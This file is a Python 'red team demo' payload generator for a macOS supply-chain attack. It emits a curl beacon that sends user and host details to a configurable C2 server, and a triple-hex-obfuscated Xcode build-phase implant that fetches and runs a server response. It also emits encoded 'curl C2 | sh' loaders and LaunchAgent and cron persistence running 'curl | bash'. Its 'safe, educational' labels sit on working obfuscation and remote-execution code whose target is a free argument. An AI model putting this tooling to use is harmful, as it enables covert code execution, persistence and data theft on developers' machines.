#!/usr/bin/env python3
"""
RED TEAM DEMO - Payload Generator
==================================
Generates safe demonstration payloads for the supply chain attack demo.
All payloads are NON-DESTRUCTIVE and designed for educational purposes.

Usage:
    python3 payload_generator.py --type shell --c2 http://localhost:8888
    python3 payload_generator.py --type applescript --output payload.scpt
    python3 payload_generator.py --type encoded --layers 3
"""

import argparse
import base64
import binascii
import sys
from datetime import datetime

# ============================================================================
# SAFE DEMO PAYLOAD TEMPLATES
# ============================================================================

SHELL_PAYLOAD_TEMPLATE = '''#!/usr/bin/env bash
# RED TEAM DEMO - Safe Demonstration Payload
# This payload is NON-DESTRUCTIVE and for educational purposes only

C2_SERVER="{c2_server}"
BEACON_ID="{beacon_id}"

echo "[DEMO] Supply Chain Attack Simulation Started"
echo "[DEMO] Timestamp: $(date)"
echo "[DEMO] User: $(whoami)"
echo "[DEMO] Host: $(hostname)"

# Log to demo file (safe operation)
mkdir -p /tmp/redteam_demo
echo "$(date): Beacon $BEACON_ID executed by $(whoami) on $(hostname)" >> /tmp/redteam_demo/activity.log

# Simulate C2 beacon (safe - just a curl)
echo "[DEMO] Sending beacon to C2..."
curl -s -X POST "$C2_SERVER/s/$BEACON_ID" \\
    -d "p=macos&u=$(whoami)&a=$(date +%s),$(uptime | md5 | cut -c1-8),demo,safe" \\
    -A "DemoPayload/1.0" \\
    -o /tmp/redteam_demo/response.txt 2>/dev/null

if [ -f /tmp/redteam_demo/response.txt ]; then
    echo "[DEMO] C2 Response received"
    echo "[DEMO] Response saved to /tmp/redteam_demo/response.txt"
fi

echo "[DEMO] Payload execution complete"
echo "[DEMO] Check /tmp/redteam_demo/ for artifacts"
'''

APPLESCRIPT_PAYLOAD_TEMPLATE = '''-- RED TEAM DEMO - Safe AppleScript Payload
-- This payload is NON-DESTRUCTIVE and for educational purposes only

try
    -- Display notification (visible indicator)
    display notification "Supply Chain Attack Demo - Payload Executed" with title "RED TEAM DEMO" subtitle "Educational Exercise"
    
    -- Show dialog for demonstration
    display dialog "RED TEAM DEMO" & return & return & \\
        "This dialog simulates malware execution." & return & \\
        "In a real attack, this would be:" & return & \\
        "  - Silent (no UI)" & return & \\
        "  - Persistent" & return & \\
        "  - Exfiltrating data" & return & return & \\
        "User: " & (do shell script "whoami") & return & \\
        "Host: " & (do shell script "hostname") \\
        with title "Supply Chain Attack Simulation" \\
        buttons {{"OK"}} default button "OK" \\
        with icon caution
    
    -- Log to demo file
    do shell script "mkdir -p /tmp/redteam_demo && echo 'AppleScript payload executed at $(date)' >> /tmp/redteam_demo/activity.log"
    
on error errMsg
    -- Silent failure (mimics real malware behavior)
    do shell script "echo 'Error: " & errMsg & "' >> /tmp/redteam_demo/errors.log"
end try
'''

PERSISTENCE_DEMO_TEMPLATE = '''#!/usr/bin/env bash
# RED TEAM DEMO - Persistence Mechanism Demonstration
# Shows common macOS persistence techniques (SAFE - does not actually install)

C2_SERVER="{c2_server}"
DEMO_MODE=true

echo "=============================================="
echo "    RED TEAM DEMO - Persistence Techniques"
echo "=============================================="
echo ""
echo "[INFO] This script DEMONSTRATES persistence techniques"
echo "[INFO] It does NOT actually install anything"
echo ""

# 1. LaunchAgent (User-level persistence)
LAUNCH_AGENT_PLIST='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.demo.redteam</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s {c2_server}/s/persist | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>'

echo "[TECHNIQUE 1] LaunchAgent"
echo "  Location: ~/Library/LaunchAgents/com.demo.redteam.plist"
echo "  Trigger: User login + hourly interval"
echo "  Detection: launchctl list | grep demo"
echo ""
echo "  Example plist content:"
echo "$LAUNCH_AGENT_PLIST" | head -10
echo "  ..."
echo ""

# 2. Login Items
echo "[TECHNIQUE 2] Login Items"
echo "  Method: osascript to add login item"
echo "  Command: osascript -e 'tell application \"System Events\" to make login item...'"
echo "  Detection: Check System Preferences > Users > Login Items"
echo ""

# 3. Cron Jobs
echo "[TECHNIQUE 3] Cron Jobs"
echo "  Method: Add entry to user crontab"
echo "  Command: (crontab -l; echo '*/60 * * * * curl C2 | bash') | crontab -"
echo "  Detection: crontab -l"
echo ""

# 4. Dylib Hijacking
echo "[TECHNIQUE 4] Dylib Injection"
echo "  Method: DYLD_INSERT_LIBRARIES environment variable"
echo "  Target: Applications that don't use hardened runtime"
echo "  Detection: Check process environment variables"
echo ""

# 5. Periodic Scripts
echo "[TECHNIQUE 5] Periodic Scripts"
echo "  Location: /etc/periodic/daily/, /etc/periodic/weekly/"
echo "  Trigger: Runs on schedule via periodic utility"
echo "  Detection: ls -la /etc/periodic/*/"
echo ""

# Log demonstration
mkdir -p /tmp/redteam_demo
echo "Persistence techniques demonstrated at $(date)" >> /tmp/redteam_demo/activity.log

echo "=============================================="
echo "[COMPLETE] Persistence demonstration finished"
echo "Check /tmp/redteam_demo/activity.log for logs"
echo "=============================================="
'''

# ============================================================================
# ENCODING FUNCTIONS
# ============================================================================

def hex_encode(data: str) -> str:
    """Encode string to hex"""
    return binascii.hexlify(data.encode()).decode()

def triple_hex_encode(data: str) -> str:
    """Triple hex encode (mimics original malware obfuscation)"""
    result = data
    for _ in range(3):
        result = hex_encode(result)
    return result

def base64_encode(data: str) -> str:
    """Base64 encode"""
    return base64.b64encode(data.encode()).decode()

def generate_encoded_shell_payload(command: str, layers: int = 3) -> str:
    """Generate obfuscated shell payload with multiple encoding layers"""
    encoded = command
    
    # Apply hex encoding layers
    for i in range(layers):
        encoded = hex_encode(encoded)
    
    # Generate decoder
    decoder = f"echo '{encoded}' | " + " | ".join(["xxd -p -r"] * layers) + " | sh"
    
    return decoder

def generate_applescript_wrapper(payload: str) -> str:
    """Wrap payload in AppleScript execution"""
    b64_payload = base64_encode(payload)
    
    wrapper = f'''try
    do shell script "osascript -e \\"$(echo {b64_payload} | base64 -D)\\""
end try'''
    
    return wrapper

# ============================================================================
# GENERATOR FUNCTIONS
# ============================================================================

def generate_shell_payload(c2_server: str, beacon_id: str = "demo") -> str:
    """Generate shell beacon payload"""
    return SHELL_PAYLOAD_TEMPLATE.format(
        c2_server=c2_server,
        beacon_id=beacon_id
    )

def generate_applescript_payload() -> str:
    """Generate AppleScript notification payload"""
    return APPLESCRIPT_PAYLOAD_TEMPLATE

def generate_persistence_demo(c2_server: str) -> str:
    """Generate persistence technique demonstration"""
    return PERSISTENCE_DEMO_TEMPLATE.format(c2_server=c2_server)

def generate_xcode_build_script(c2_server: str, beacon_id: str = "xcode") -> str:
    """Generate the malicious Xcode build phase script"""
    
    # The actual command to execute
    beacon_command = f'''curl -s -X POST "{c2_server}/s/{beacon_id}" -d "p=macos&u=$(whoami)&a=$(date +%s)" > /tmp/.demo.txt 2>/dev/null
if [ -f /tmp/.demo.txt ]; then
    osascript /tmp/.demo.txt 2>/dev/null
fi
echo "[DEMO] Build script executed at $(date)" >> /tmp/redteam_demo/build.log
mkdir -p /tmp/redteam_demo'''
    
    # Triple hex encode
    encoded = triple_hex_encode(beacon_command)
    
    # Generate the xcassets.sh script
    script = f'''#!/usr/bin/env bash
# RED TEAM DEMO - Xcode Build Phase Implant
# This is a DEMONSTRATION - creates visible artifacts

# Create demo directory
mkdir -p /tmp/redteam_demo

# Log execution
echo "[DEMO] Xcode build script triggered at $(date)" >> /tmp/redteam_demo/build.log
echo "[DEMO] Project: $PROJECT_DIR" >> /tmp/redteam_demo/build.log
echo "[DEMO] User: $(whoami)" >> /tmp/redteam_demo/build.log

# Execute encoded payload (triple hex)
x=$(echo '{encoded}' | xxd -p -r | xxd -p -r | xxd -p -r | sh)
bash -c "$x" 2>/dev/null

# Show notification for demo visibility
osascript -e 'display notification "Build script executed - check /tmp/redteam_demo/" with title "RED TEAM DEMO"' 2>/dev/null

exit 0
'''
    
    return script

# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='RED TEAM DEMO - Payload Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    # Generate shell beacon
    python3 payload_generator.py --type shell --c2 http://localhost:8888
    
    # Generate AppleScript payload
    python3 payload_generator.py --type applescript
    
    # Generate Xcode build script
    python3 payload_generator.py --type xcode --c2 http://localhost:8888
    
    # Generate persistence demo
    python3 payload_generator.py --type persistence --c2 http://localhost:8888
    
    # Save to file
    python3 payload_generator.py --type shell --c2 http://localhost:8888 -o payload.sh
        '''
    )
    
    parser.add_argument('--type', '-t', required=True,
                       choices=['shell', 'applescript', 'xcode', 'persistence', 'encoded'],
                       help='Type of payload to generate')
    parser.add_argument('--c2', '-c', default='http://localhost:8888',
                       help='C2 server URL (default: http://localhost:8888)')
    parser.add_argument('--beacon-id', '-b', default='demo',
                       help='Beacon identifier (default: demo)')
    parser.add_argument('--output', '-o', help='Output file (default: stdout)')
    parser.add_argument('--layers', '-l', type=int, default=3,
                       help='Encoding layers for encoded type (default: 3)')
    
    args = parser.parse_args()
    
    # Generate payload
    if args.type == 'shell':
        payload = generate_shell_payload(args.c2, args.beacon_id)
    elif args.type == 'applescript':
        payload = generate_applescript_payload()
    elif args.type == 'xcode':
        payload = generate_xcode_build_script(args.c2, args.beacon_id)
    elif args.type == 'persistence':
        payload = generate_persistence_demo(args.c2)
    elif args.type == 'encoded':
        # Demo command for encoded payload
        cmd = f'curl -s {args.c2}/s/{args.beacon_id} | sh'
        payload = generate_encoded_shell_payload(cmd, args.layers)
    else:
        print(f"[!] Unknown payload type: {args.type}")
        sys.exit(1)
    
    # Output
    if args.output:
        with open(args.output, 'w') as f:
            f.write(payload)
        print(f"[+] Payload written to {args.output}")
        if args.type in ['shell', 'xcode', 'persistence']:
            print(f"[+] Make executable: chmod +x {args.output}")
    else:
        print(payload)

if __name__ == '__main__':
    main()
